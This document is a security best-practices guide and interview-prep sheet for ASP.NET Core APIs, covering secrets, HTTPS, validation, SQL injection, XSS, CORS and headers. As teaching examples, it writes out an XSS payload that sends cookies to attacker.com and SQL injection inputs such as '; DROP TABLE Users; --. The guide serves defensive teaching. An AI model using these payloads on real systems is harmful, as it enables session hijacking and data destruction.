# Security Best Practices - Deep Dive

## Table of Contents

- [Security Principles](#security-principles)
- [Secret Management](#secret-management)
- [Transport Security (HTTPS)](#transport-security-https)
- [Input Validation](#input-validation)
- [SQL Injection Prevention](#sql-injection-prevention)
- [XSS Prevention](#xss-prevention)
- [CORS Configuration](#cors-configuration)
- [Security Headers](#security-headers)
- [Logging Sensitive Data](#logging-sensitive-data)
- [Production Security Checklist](#production-security-checklist)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Interview Questions](#interview-questions)

---

## Security Principles

### Defense in Depth

**Concept:** Multiple layers of security, so if one fails, others protect the system.

```
┌────────────────────────────────────────┐
│  Layer 1: Network (Firewall, WAF)     │ ← Block malicious traffic
├────────────────────────────────────────┤
│  Layer 2: Gateway (Auth, Rate Limit)  │ ← Authenticate & throttle
├────────────────────────────────────────┤
│  Layer 3: Application (Input validation)│ ← Validate all inputs
├────────────────────────────────────────┤
│  Layer 4: Service (Authorization)     │ ← Check permissions
├────────────────────────────────────────┤
│  Layer 5: Database (Parameterized)    │ ← Prevent SQL injection
├────────────────────────────────────────┤
│  Layer 6: Audit (Logging, Monitoring) │ ← Detect & respond
└────────────────────────────────────────┘

If attacker bypasses Layer 1, Layers 2-6 still protect!
```

### Principle of Least Privilege

**Concept:** Grant minimum permissions required to perform a task.

```
❌ Bad: Give all users Admin access
✅ Good: Give users only what they need

Examples:
- API Gateway: Only forward requests (no DB access)
- BookingService: Only access Bookings table (not Users)
- Database user: Read/write on specific tables only
- JWT: Include only necessary claims
```

### Fail Securely

**Concept:** If something goes wrong, deny access by default.

```csharp
// ❌ Bad: Fails open (grants access on error)
try
{
    if (await IsAuthorized(userId, bookingId))
        return Ok(booking);
    return Forbid();
}
catch
{
    return Ok(booking);  // ERROR: Grants access on exception!
}

// ✅ Good: Fails closed (denies access on error)
try
{
    if (await IsAuthorized(userId, bookingId))
        return Ok(booking);
    return Forbid();
}
catch (Exception ex)
{
    _logger.LogError(ex, "Authorization check failed");
    return StatusCode(500, "Authorization error");  // Deny access
}
```

### Never Trust Client Input

**Concept:** All client-provided data is potentially malicious.

```csharp
// ❌ Bad: Trust client
var userId = request.UserId;  // Client can set ANY user ID!

// ✅ Good: Use authenticated context
var userId = Request.Headers["X-User-Id"];  // From gateway (authenticated)
```

---

## Secret Management

### What Are Secrets?

**Secrets** are sensitive values that must be protected:
- Database passwords
- JWT signing keys
- API keys (payment gateway, email service)
- Encryption keys
- Connection strings

### Never Hardcode Secrets

**❌ NEVER do this:**

```csharp
// TERRIBLE! Secret in code
var secretKey = "my-super-secret-jwt-key-12345";

// TERRIBLE! Secret in appsettings.json (committed to Git)
{
  "JwtSettings": {
    "SecretKey": "my-super-secret-jwt-key-12345"
  }
}
```

**Why it's bad:**
- Committed to Git → Visible in history forever
- Developers have access → Leaked credentials
- Can't rotate keys without code changes
- Different keys for dev/prod requires code changes

### Use Environment Variables

**✅ Correct approach:**

```csharp
// Read from environment variable
var secretKey = Environment.GetEnvironmentVariable("JWT_SECRET_KEY");

if (string.IsNullOrEmpty(secretKey))
{
    throw new InvalidOperationException("JWT_SECRET_KEY environment variable not set");
}
```

**Configuration:**

```bash
# .env file (NEVER commit to Git!)
JWT_SECRET_KEY=kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r
DATABASE_PASSWORD=SuperSecurePassword!2024
PAYMENT_API_KEY=sk_live_abc123xyz789
```

**Docker Compose:**

```yaml
services:
  userservice:
    environment:
      - JWT_SECRET_KEY=${JWT_SECRET_KEY}
      - DATABASE_PASSWORD=${DATABASE_PASSWORD}
    env_file:
      - .env
```

**Add .env to .gitignore:**

```gitignore
# Secrets
.env
.env.local
.env.production
*.secrets
```

### Secret Rotation

**Best practice:** Rotate secrets periodically (every 90 days).

```
Process:
1. Generate new secret
2. Update environment variable
3. Restart services
4. Old JWT tokens remain valid until expiration
5. New tokens signed with new key

For zero-downtime rotation:
1. Support multiple keys (key versioning)
2. Sign with new key, validate with old + new
3. After token expiration period, remove old key
```

### Use Secret Management Services

**Production-grade options:**

```
Azure Key Vault:
- Centralized secret storage
- Access control (RBAC)
- Audit logging
- Automatic rotation

AWS Secrets Manager:
- Similar to Azure Key Vault
- Integration with AWS services
- Automatic rotation

HashiCorp Vault:
- Open-source secret management
- Dynamic secrets
- Encryption as a service

Kubernetes Secrets:
- Store secrets in K8s cluster
- Mount as environment variables
- Base64 encoded (not encrypted!)
```

**Example with Azure Key Vault:**

```csharp
// Install: Azure.Identity, Azure.Security.KeyVault.Secrets

var keyVaultUrl = "https://mybookingsystem.vault.azure.net/";
var client = new SecretClient(new Uri(keyVaultUrl), new DefaultAzureCredential());

// Retrieve secret
var secret = await client.GetSecretAsync("JWT-SECRET-KEY");
var secretKey = secret.Value.Value;

// Use in JWT configuration
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey))
        };
    });
```

### Generating Strong Secrets

**Requirements:**
- Minimum 256 bits (32 bytes) for JWT keys
- Cryptographically random (not predictable)
- Unique per environment

**PowerShell:**

```powershell
# Generate 64-byte (512-bit) random key
$bytes = [byte[]]::new(64)
[Security.Cryptography.RandomNumberGenerator]::Fill($bytes)
$key = [Convert]::ToBase64String($bytes)
Write-Output $key

# Output: kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r
```

**Linux/macOS:**

```bash
# Generate 64-byte random key
openssl rand -base64 64

# Output: kL8mN3pQ7rS9tU2vW4xY6zA8bC0dE1fG3hI5jK7lM9nO1pQ3rS5tU7vW9xY0zA2bC4dE6fG8hI0jK2lM4nO6pQ8r
```

---

## Transport Security (HTTPS)

### Why HTTPS is Critical

**HTTP (unencrypted):**

```
Client → "Authorization: Bearer eyJhbGc..." → Server

Attacker (man-in-the-middle):
- Intercepts plain-text JWT token
- Uses token to impersonate user
- Steals sensitive data
```

**HTTPS (encrypted):**

```
Client → [Encrypted TLS tunnel] → Server

Attacker sees: Gibberish encrypted data
Cannot decrypt without private key
```

### Enforce HTTPS

**ASP.NET Core configuration:**

```csharp
// Program.cs

// Redirect HTTP to HTTPS
app.UseHttpsRedirection();

// Enable HSTS (HTTP Strict Transport Security)
if (!app.Environment.IsDevelopment())
{
    app.UseHsts();
}
```

**HSTS Headers:**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Tells browser:
- Always use HTTPS for this domain
- For 365 days (31536000 seconds)
- Include all subdomains
- Submit to preload list (hardcoded in browsers)
```

### TLS Configuration

**Minimum TLS version:**

```csharp
// appsettings.json
{
  "Kestrel": {
    "EndpointDefaults": {
      "Protocols": "Http1AndHttp2",
      "SslProtocols": ["Tls12", "Tls13"]  // Only TLS 1.2 and 1.3
    }
  }
}
```

**Why disable TLS 1.0/1.1:**
- Known vulnerabilities (BEAST, POODLE)
- PCI DSS compliance requires TLS 1.2+
- Modern browsers support TLS 1.2/1.3

### Certificate Management

**Development:**

```bash
# Generate self-signed certificate
dotnet dev-certs https --trust
```

**Production:**

```
Use certificates from trusted CA:
- Let's Encrypt (free, automated)
- DigiCert, Sectigo (paid)
- Cloud provider certificates (Azure, AWS)

Certificate renewal:
- Let's Encrypt: Every 90 days (automated)
- Paid certs: Annually
- Set up monitoring/alerts for expiration
```

---

## Input Validation

### Validate All Inputs

**Principle:** Reject invalid data early, before processing.

```csharp
public record CreateBookingRequest
{
    [Required(ErrorMessage = "EventName is required")]
    [StringLength(100, MinimumLength = 3, ErrorMessage = "EventName must be 3-100 characters")]
    public string EventName { get; init; }
    
    [Required(ErrorMessage = "EventDate is required")]
    [FutureDate(ErrorMessage = "EventDate must be in the future")]
    public DateTime EventDate { get; init; }
    
    [Required]
    [Range(1, 1000, ErrorMessage = "TicketQuantity must be 1-1000")]
    public int TicketQuantity { get; init; }
    
    [EmailAddress(ErrorMessage = "Invalid email format")]
    public string? Email { get; init; }
}

// Custom validation attribute
public class FutureDateAttribute : ValidationAttribute
{
    protected override ValidationResult IsValid(object value, ValidationContext validationContext)
    {
        if (value is DateTime date && date <= DateTime.UtcNow)
        {
            return new ValidationResult("Date must be in the future");
        }
        return ValidationResult.Success;
    }
}
```

**Controller-level validation:**

```csharp
[HttpPost]
public IActionResult CreateBooking([FromBody] CreateBookingRequest request)
{
    // Automatic validation from DataAnnotations
    if (!ModelState.IsValid)
    {
        return BadRequest(ModelState);
    }
    
    // Additional business logic validation
    if (request.EventDate < DateTime.UtcNow.AddDays(1))
    {
        return BadRequest("Bookings must be made at least 1 day in advance");
    }
    
    // Process valid request
    var booking = _service.CreateBooking(request);
    return Created($"/api/bookings/{booking.Id}", booking);
}
```

### Whitelist vs Blacklist

**❌ Blacklist approach (bad):**

```csharp
// Try to block all malicious patterns
if (input.Contains("<script>") || 
    input.Contains("DROP TABLE") ||
    input.Contains("'; --"))
{
    return BadRequest("Invalid input");
}

// Problem: Infinite variations!
// <SCRIPT>, %3Cscript%3E, drop table, DrOp TaBlE, etc.
```

**✅ Whitelist approach (good):**

```csharp
// Only allow known-good patterns
[RegularExpression(@"^[a-zA-Z0-9\s\-]+$", ErrorMessage = "EventName contains invalid characters")]
public string EventName { get; init; }

// Only allows: letters, numbers, spaces, hyphens
// Rejects: <script>, SQL, special characters
```

### Sanitize Output

**Context-specific encoding:**

```csharp
// HTML encoding (prevent XSS)
var safeOutput = HtmlEncoder.Default.Encode(userInput);
// Input:  <script>alert('XSS')</script>
// Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;

// URL encoding
var safeUrl = Uri.EscapeDataString(userInput);
// Input:  user@example.com?param=value
// Output: user%40example.com%3Fparam%3Dvalue

// JavaScript encoding
var safeJs = JavaScriptEncoder.Default.Encode(userInput);
// Input:  '; alert('XSS'); //
// Output: \u0027; alert(\u0027XSS\u0027); //
```

---

## SQL Injection Prevention

### What is SQL Injection?

**Attack:** Inject SQL code through user input to manipulate database queries.

**Example attack:**

```sql
-- Application code (VULNERABLE)
var query = $"SELECT * FROM Users WHERE Username = '{username}' AND Password = '{password}'";

-- Attacker input:
Username: admin' --
Password: anything

-- Resulting query:
SELECT * FROM Users WHERE Username = 'admin' -- ' AND Password = 'anything'
                                    ↑
                            Comment out password check!

-- Result: Attacker logs in as admin without password!
```

### Never Use String Concatenation

**❌ NEVER do this:**

```csharp
// VULNERABLE TO SQL INJECTION!
var username = request.Username;
var query = $"SELECT * FROM Users WHERE Username = '{username}'";
var user = await _context.Database.ExecuteSqlRawAsync(query);
```

**Attacker input:**

```
Username: '; DROP TABLE Users; --

Resulting query:
SELECT * FROM Users WHERE Username = ''; DROP TABLE Users; --'
                                          ↑
                                    Deletes entire table!
```

### Use Parameterized Queries

**✅ Always use parameters:**

```csharp
// Safe: Uses parameterized query
var username = request.Username;
var user = await _context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Username = {username}")
    .FirstOrDefaultAsync();

// EF Core converts to:
// SELECT * FROM Users WHERE Username = @p0
// Parameter @p0 = "admin' --"
// SQL treats entire input as string literal (safe!)
```

### Use Entity Framework Core (Recommended)

**EF Core automatically prevents SQL injection:**

```csharp
// Safe: EF Core uses parameters internally
var user = await _context.Users
    .Where(u => u.Username == username)
    .FirstOrDefaultAsync();

// Generated SQL:
// SELECT * FROM Users WHERE Username = @p0
// Parameter @p0 = "admin' --"
```

**Even complex queries are safe:**

```csharp
// Safe: All inputs parameterized
var bookings = await _context.Bookings
    .Where(b => b.UserId == userId && b.EventDate >= startDate)
    .OrderBy(b => b.EventDate)
    .ToListAsync();

// Generated SQL:
// SELECT * FROM Bookings WHERE UserId = @p0 AND EventDate >= @p1 ORDER BY EventDate
// Parameters: @p0 = userId, @p1 = startDate
```

### Stored Procedures

**Another safe approach:**

```sql
-- Create stored procedure
CREATE PROCEDURE GetUserByUsername
    @Username NVARCHAR(100)
AS
BEGIN
    SELECT * FROM Users WHERE Username = @Username
END
```

```csharp
// Call stored procedure (safe)
var user = await _context.Users
    .FromSqlInterpolated($"EXEC GetUserByUsername {username}")
    .FirstOrDefaultAsync();
```

### When You MUST Use Raw SQL

**Use parameterized raw SQL:**

```csharp
// Safe: Uses parameters
var username = request.Username;
var users = await _context.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Username = {0}", username)
    .ToListAsync();

// Or with named parameters:
var users = await _context.Users
    .FromSqlRaw(
        "SELECT * FROM Users WHERE Username = @username",
        new SqlParameter("@username", username))
    .ToListAsync();
```

---

## XSS Prevention

### What is XSS (Cross-Site Scripting)?

**Attack:** Inject malicious JavaScript that executes in victim's browser.

**Example:**

```
User posts comment:
"Great article! <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"

Other users view comment:
- Browser executes script
- Steals their session cookies
- Sends to attacker
- Attacker hijacks session
```

### Types of XSS

**1. Stored XSS (Persistent):**

```
1. Attacker submits malicious comment to database
2. Application stores comment without sanitization
3. Other users load page
4. Malicious script executes in their browser
```

**2. Reflected XSS (Non-persistent):**

```
URL: https://example.com/search?q=<script>alert('XSS')</script>

Application displays: "Search results for: <script>alert('XSS')</script>"
Script executes in user's browser
```

**3. DOM-based XSS:**

```javascript
// Vulnerable code
document.getElementById('output').innerHTML = userInput;

// Attacker input: <img src=x onerror="alert('XSS')">
// Result: Script executes
```

### ASP.NET Core Built-in Protection

**Razor views automatically encode:**

```html
<!-- Razor view -->
<p>Welcome, @Model.Username</p>

<!-- If Username = "<script>alert('XSS')</script>" -->
<!-- Rendered HTML (safe): -->
<p>Welcome, &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</p>

<!-- Script won't execute (displayed as text) -->
```

### Manual Encoding

**When building HTML in C#:**

```csharp
using System.Text.Encodings.Web;

// HTML encoding
var safeHtml = HtmlEncoder.Default.Encode(userInput);
return $"<div>{safeHtml}</div>";

// JavaScript encoding (for inline scripts)
var safeJs = JavaScriptEncoder.Default.Encode(userInput);
return $"<script>var username = '{safeJs}';</script>";

// URL encoding (for query parameters)
var safeUrl = UrlEncoder.Default.Encode(userInput);
return $"<a href='/search?q={safeUrl}'>Search</a>";
```

### Content Security Policy (CSP)

**Restrict script sources:**

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; " +              // Only load from same origin
        "script-src 'self'; " +                // Scripts only from same origin
        "style-src 'self' 'unsafe-inline'; " + // Styles from same origin + inline
        "img-src 'self' data: https:; " +     // Images from same origin + data URIs + HTTPS
        "connect-src 'self'; " +               // AJAX only to same origin
        "font-src 'self'; " +                  // Fonts only from same origin
        "object-src 'none'; " +                // Block Flash, Java applets
        "frame-ancestors 'none';");            // Prevent clickjacking
    
    await next();
});
```

**Effect:** Even if attacker injects `<script>`, CSP blocks it!

```
Injected: <script src="https://attacker.com/evil.js"></script>

Browser console:
Refused to load script from 'https://attacker.com/evil.js' because it violates
the Content-Security-Policy directive: "script-src 'self'".
```

---

## CORS Configuration

### What is CORS?

**CORS (Cross-Origin Resource Sharing)** controls which domains can make requests to your API.

**Same-Origin Policy (browser security):**

```
Your website: https://booking.example.com
Your API:     https://api.booking.example.com

Without CORS: Browser blocks API requests (different origin)
With CORS:    Server explicitly allows requests from website
```

### Configure CORS

**Development (permissive):**

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Development", policy =>
    {
        policy.AllowAnyOrigin()       // Any domain
              .AllowAnyMethod()        // GET, POST, PUT, DELETE
              .AllowAnyHeader();       // Any headers
    });
});

app.UseCors("Development");
```

**Production (restrictive):**

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Production", policy =>
    {
        policy.WithOrigins(
                  "https://booking.example.com",      // Production website
                  "https://admin.booking.example.com" // Admin dashboard
              )
              .WithMethods("GET", "POST", "PUT", "DELETE")  // Allowed HTTP methods
              .WithHeaders("Content-Type", "Authorization") // Allowed headers
              .AllowCredentials();                          // Allow cookies/auth
    });
});

app.UseCors("Production");
```

**Environment-based configuration:**

```csharp
var corsPolicy = app.Environment.IsDevelopment() ? "Development" : "Production";
app.UseCors(corsPolicy);
```

### CORS Preflight

**Browser sends OPTIONS request:**

```
REQUEST:
OPTIONS /api/bookings HTTP/1.1
Origin: https://booking.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization,content-type

RESPONSE:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://booking.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Max-Age: 3600
```

**If preflight succeeds, browser sends actual request.**

---

## Security Headers

### Essential Security Headers

```csharp
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    
    // 1. Strict-Transport-Security (HSTS)
    // Forces HTTPS for 1 year, including subdomains
    headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains";
    
    // 2. X-Content-Type-Options
    // Prevents MIME type sniffing
    headers["X-Content-Type-Options"] = "nosniff";
    
    // 3. X-Frame-Options
    // Prevents clickjacking (embedding in iframes)
    headers["X-Frame-Options"] = "DENY";
    
    // 4. X-XSS-Protection
    // Enable browser's XSS filter (legacy browsers)
    headers["X-XSS-Protection"] = "1; mode=block";
    
    // 5. Content-Security-Policy
    // Restricts resource loading (prevents XSS)
    headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'";
    
    // 6. Referrer-Policy
    // Controls Referer header sent to other sites
    headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    
    // 7. Permissions-Policy
    // Controls browser features (camera, microphone, etc.)
    headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()";
    
    await next();
});
```

### Security Headers Package

**Use NWebsec for easier configuration:**

```bash
dotnet add package NWebsec.AspNetCore.Middleware
```

```csharp
app.UseHsts(options => options.MaxAge(365));
app.UseXContentTypeOptions();
app.UseXfo(options => options.Deny());
app.UseXXssProtection(options => options.EnabledWithBlockMode());
app.UseCsp(options => options
    .DefaultSources(s => s.Self())
    .ScriptSources(s => s.Self()));
```

---

## Logging Sensitive Data

### Never Log Secrets

**❌ NEVER log:**

```csharp
// TERRIBLE! Logs password
_logger.LogInformation("User login: {Username} with password {Password}", 
    username, password);

// TERRIBLE! Logs JWT token
_logger.LogInformation("Received JWT: {Token}", jwtToken);

// TERRIBLE! Logs credit card
_logger.LogInformation("Payment: Card {CardNumber}", cardNumber);
```

**✅ Log safely:**

```csharp
// Good: Only log username (not password)
_logger.LogInformation("User login attempt: {Username}", username);

// Good: Log token metadata (not token itself)
_logger.LogInformation("JWT validated for user: {UserId}", userId);

// Good: Log masked card number
_logger.LogInformation("Payment: Card ending {Last4}", cardNumber.Substring(cardNumber.Length - 4));
```

### Structured Logging

**Use Serilog for structured logs:**

```csharp
Log.Information(
    "Booking created: {BookingId} by {UserId} for {EventName}",
    booking.Id, userId, eventName);

// Produces JSON:
{
  "Timestamp": "2024-11-12T14:30:00Z",
  "Level": "Information",
  "MessageTemplate": "Booking created: {BookingId} by {UserId} for {EventName}",
  "Properties": {
    "BookingId": "abc123",
    "UserId": "3fa85f64...",
    "EventName": "Concert"
  }
}
```

### Redact Sensitive Fields

**Custom Serilog enricher:**

```csharp
public class SensitiveDataEnricher : ILogEventEnricher
{
    public void Enrich(LogEvent logEvent, ILogEventPropertyFactory propertyFactory)
    {
        foreach (var property in logEvent.Properties.ToList())
        {
            if (IsSensitiveProperty(property.Key))
            {
                logEvent.RemovePropertyIfPresent(property.Key);
                logEvent.AddPropertyIfAbsent(
                    propertyFactory.CreateProperty(property.Key, "[REDACTED]"));
            }
        }
    }
    
    private bool IsSensitiveProperty(string key)
    {
        var sensitiveKeys = new[] { "password", "token", "secret", "apikey", "cardnumber" };
        return sensitiveKeys.Any(k => key.IndexOf(k, StringComparison.OrdinalIgnoreCase) >= 0);
    }
}

// Configure Serilog
Log.Logger = new LoggerConfiguration()
    .Enrich.With<SensitiveDataEnricher>()
    .WriteTo.Seq("http://localhost:5341")
    .CreateLogger();
```

---

## Production Security Checklist

### Pre-Deployment Checklist

**Authentication & Authorization:**
- [ ] All secrets in environment variables (not code)
- [ ] JWT secret key is strong (256+ bits)
- [ ] Token expiration is reasonable (15-60 min)
- [ ] ClockSkew set to zero or minimal
- [ ] Authorization policies applied to all protected routes
- [ ] Resource ownership checks implemented

**Transport Security:**
- [ ] HTTPS enforced (HTTP redirects to HTTPS)
- [ ] HSTS enabled with appropriate max-age
- [ ] TLS 1.2+ only (disable TLS 1.0/1.1)
- [ ] Valid SSL certificate from trusted CA
- [ ] Certificate expiration monitoring

**Input Validation:**
- [ ] All inputs validated (DataAnnotations or FluentValidation)
- [ ] Whitelist approach for string inputs
- [ ] Output encoding for all user-generated content
- [ ] File upload restrictions (size, type, content validation)

**Database Security:**
- [ ] Parameterized queries everywhere (EF Core)
- [ ] No raw SQL with string concatenation
- [ ] Database user has least privilege (not sa/root)
- [ ] Connection strings in secrets (not appsettings.json)

**API Security:**
- [ ] Rate limiting enabled
- [ ] CORS configured (specific origins, not AllowAny)
- [ ] Security headers configured
- [ ] Content Security Policy (CSP) enabled

**Logging & Monitoring:**
- [ ] No sensitive data in logs
- [ ] Structured logging configured
- [ ] Log aggregation service (Seq, ELK, Datadog)
- [ ] Alerts for security events (auth failures, rate limits)

**Dependency Security:**
- [ ] All packages up-to-date
- [ ] No known vulnerabilities (`dotnet list package --vulnerable`)
- [ ] Automated dependency scanning (Dependabot, Snyk)

**Error Handling:**
- [ ] No stack traces in production responses
- [ ] Generic error messages (not implementation details)
- [ ] Errors logged server-side

**Container Security:**
- [ ] Non-root user in Dockerfile
- [ ] Minimal base image (distroless or alpine)
- [ ] No secrets in Dockerfile or image layers
- [ ] Image scanning (Trivy, Clair)

### Post-Deployment Monitoring

**Monitor these metrics:**

```
Authentication:
- Failed login attempts (alert if >100/hour)
- JWT validation failures
- Unusual authentication patterns

Authorization:
- 403 Forbidden rate (alert if spike)
- Unauthorized access attempts
- Privilege escalation attempts

Rate Limiting:
- 429 responses (alert if >10% of traffic)
- Top rate-limited IPs/users
- Policy hit rates

Errors:
- 5xx error rate (alert if >1%)
- Exception frequency and types
- Slow requests (>5 seconds)

Infrastructure:
- Certificate expiration (alert 30 days before)
- Memory/CPU usage
- Database connection pool exhaustion
```

---

## Common Vulnerabilities

### OWASP Top 10 (2021)

**1. Broken Access Control**

```
Example: User changes URL parameter to access other user's data
GET /api/bookings/123 → Returns booking

User changes to:
GET /api/bookings/456 → Returns SOMEONE ELSE's booking!

Prevention:
- Check resource ownership
- Validate user ID from JWT (not client input)
```

**2. Cryptographic Failures**

```
Example: Storing passwords in plain text

Prevention:
- Hash passwords (bcrypt, Argon2)
- Use HTTPS (TLS encryption)
- Don't store sensitive data unnecessarily
```

**3. Injection (SQL, XSS, etc.)**

```
Prevention:
- Use parameterized queries
- Encode output
- Validate and sanitize input
```

**4. Insecure Design**

```
Example: Reset password via email without token

Prevention:
- Threat modeling during design phase
- Defense in depth
- Principle of least privilege
```

**5. Security Misconfiguration**

```
Example: Leaving default passwords
Example: Running as root user
Example: Exposing sensitive endpoints

Prevention:
- Change all defaults
- Least privilege
- Remove unnecessary features
```

**6. Vulnerable and Outdated Components**

```
Example: Using package with known CVE

Prevention:
- Keep dependencies updated
- Automated vulnerability scanning
- Monitor security advisories
```

**7. Identification and Authentication Failures**

```
Example: Weak password policy
Example: No account lockout

Prevention:
- Strong password requirements
- MFA (multi-factor authentication)
- Account lockout after failed attempts
- Rate limiting on auth endpoints
```

**8. Software and Data Integrity Failures**

```
Example: Unsigned code updates
Example: Insecure deserialization

Prevention:
- Verify package signatures
- Code signing
- Integrity checks
```

**9. Security Logging and Monitoring Failures**

```
Example: No logging of security events
Example: Logs not monitored

Prevention:
- Log authentication events
- Log authorization failures
- Centralized log aggregation
- Real-time alerting
```

**10. Server-Side Request Forgery (SSRF)**

```
Example: API accepts URL and fetches it
User input: http://localhost:6379/
Application makes request to internal Redis server!

Prevention:
- Whitelist allowed domains
- Validate and sanitize URLs
- Network segmentation
```

---

## Interview Questions

### Q1: How do you prevent SQL injection?

**Answer:**

Use **parameterized queries** or **ORM (Entity Framework Core)**.

**Bad (vulnerable):**
```csharp
var query = $"SELECT * FROM Users WHERE Username = '{username}'";
```

**Good (safe):**
```csharp
var user = await _context.Users
    .Where(u => u.Username == username)
    .FirstOrDefaultAsync();
```

EF Core automatically parameterizes queries, preventing injection. Never concatenate user input into SQL strings.

---

### Q2: What's the difference between authentication and authorization?

**Answer:**

- **Authentication:** Verifies identity (who you are)
  - Example: Login with username/password, JWT validation
  - Result: User identity established

- **Authorization:** Checks permissions (what you can do)
  - Example: Can user access booking #123?
  - Result: Allow or deny action

**Sequence:** Authenticate first, then authorize.

---

### Q3: How do you securely store passwords?

**Answer:**

**Never store plain-text passwords!**

Use **cryptographic hashing** with **salt**:

```csharp
// Register user
var passwordHash = BCrypt.Net.BCrypt.HashPassword(password);
// Result: $2a$11$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// Store hash in database (not plain password)
user.PasswordHash = passwordHash;

// Login verification
var isValid = BCrypt.Net.BCrypt.Verify(inputPassword, user.PasswordHash);
```

**Why bcrypt?**
- Slow (prevents brute force)
- Automatic salt generation
- Configurable work factor (future-proof)

**Alternatives:** Argon2 (better), PBKDF2 (acceptable), SHA256 (NOT suitable for passwords!)

---

### Q4: What is CORS and why is it needed?

**Answer:**

**CORS (Cross-Origin Resource Sharing)** allows servers to control which domains can make requests.

**Same-Origin Policy (SOP):**
Browsers block requests between different origins by default.

**Example:**
- Website: `https://booking.com`
- API: `https://api.booking.com`
- Different origins → Browser blocks API calls

**CORS solution:**
API server sends headers allowing specific origins:
```
Access-Control-Allow-Origin: https://booking.com
```

**Configuration:**
```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("Production", policy =>
    {
        policy.WithOrigins("https://booking.com")
              .AllowAnyMethod()
              .AllowAnyHeader();
    });
});
```

**Security note:** Never use `AllowAnyOrigin()` in production!

---

### Q5: How do you prevent XSS attacks?

**Answer:**

**XSS (Cross-Site Scripting):** Attacker injects malicious JavaScript into your site.

**Prevention:**

1. **Encode output:**
```csharp
var safeHtml = HtmlEncoder.Default.Encode(userInput);
```

2. **Use framework protection:**
ASP.NET Core automatically encodes Razor views.

3. **Content Security Policy (CSP):**
```csharp
headers["Content-Security-Policy"] = "script-src 'self'";
```
Blocks inline scripts and external scripts.

4. **Validate input:**
Only allow expected characters (whitelist).

5. **Never use `innerHTML`:**
Use `textContent` instead in JavaScript.

---

### Q6: What security headers should every API have?

**Answer:**

**Essential headers:**

1. **Strict-Transport-Security:** Force HTTPS
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

2. **X-Content-Type-Options:** Prevent MIME sniffing
```
X-Content-Type-Options: nosniff
```

3. **X-Frame-Options:** Prevent clickjacking
```
X-Frame-Options: DENY
```

4. **Content-Security-Policy:** Prevent XSS
```
Content-Security-Policy: default-src 'self'
```

5. **X-XSS-Protection:** Enable browser XSS filter
```
X-XSS-Protection: 1; mode=block
```

These headers provide defense-in-depth against common web attacks.

---

### Q7: How do you handle secrets in a containerized application?

**Answer:**

**Methods:**

1. **Environment variables (Docker):**
```yaml
services:
  userservice:
    environment:
      - JWT_SECRET_KEY=${JWT_SECRET_KEY}
    env_file:
      - .env
```

2. **Docker secrets (Swarm):**
```bash
docker secret create jwt_key ./jwt_key.txt
```

3. **Kubernetes secrets:**
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: jwt-secret
data:
  key: <base64-encoded-secret>
```

4. **Cloud secret managers:**
- Azure Key Vault
- AWS Secrets Manager
- Google Secret Manager

**Best practices:**
- Never bake secrets into images
- Use secret management service in production
- Rotate secrets periodically
- Audit secret access

---

### Q8: Explain the principle of least privilege with examples.

**Answer:**

**Principle:** Grant minimum permissions needed to perform a task.

**Examples:**

1. **Database user:**
```sql
-- Bad: Grant all privileges
GRANT ALL PRIVILEGES ON * TO 'appuser';

-- Good: Only needed permissions
GRANT SELECT, INSERT, UPDATE ON bookings.* TO 'appuser';
```

2. **JWT claims:**
```csharp
// Bad: Include everything
new Claim("roles", "Admin,Manager,User,SuperUser")

// Good: Only necessary role
new Claim("role", "User")
```

3. **Container user:**
```dockerfile
# Bad: Run as root
# (default)

# Good: Run as non-root user
USER appuser
```

4. **API Gateway:**
- Only forward requests (no database access)
- Only read JWT secret (not write)

**Benefits:**
- Limits damage from compromised accounts
- Reduces attack surface
- Easier to audit

---

## Summary

**Core Security Principles:**
1. **Defense in depth:** Multiple security layers
2. **Least privilege:** Minimum necessary permissions
3. **Fail securely:** Deny access on errors
4. **Never trust input:** Validate everything

**Key Practices:**
- Store secrets in environment variables/secret managers
- Enforce HTTPS with HSTS
- Validate all inputs (whitelist approach)
- Use parameterized queries (prevent SQL injection)
- Encode output (prevent XSS)
- Configure CORS restrictively
- Add security headers
- Never log sensitive data
- Keep dependencies updated
- Monitor security events

**Production Checklist:**
- Authentication & authorization configured
- HTTPS enforced with valid certificate
- Input validation on all endpoints
- SQL injection prevented (EF Core)
- Rate limiting enabled
- CORS configured properly
- Security headers added
- Logging configured (no sensitive data)
- Dependencies scanned for vulnerabilities
- Error handling doesn't leak information

Security is not a feature—it's a requirement! Build it in from day one, not as an afterthought.
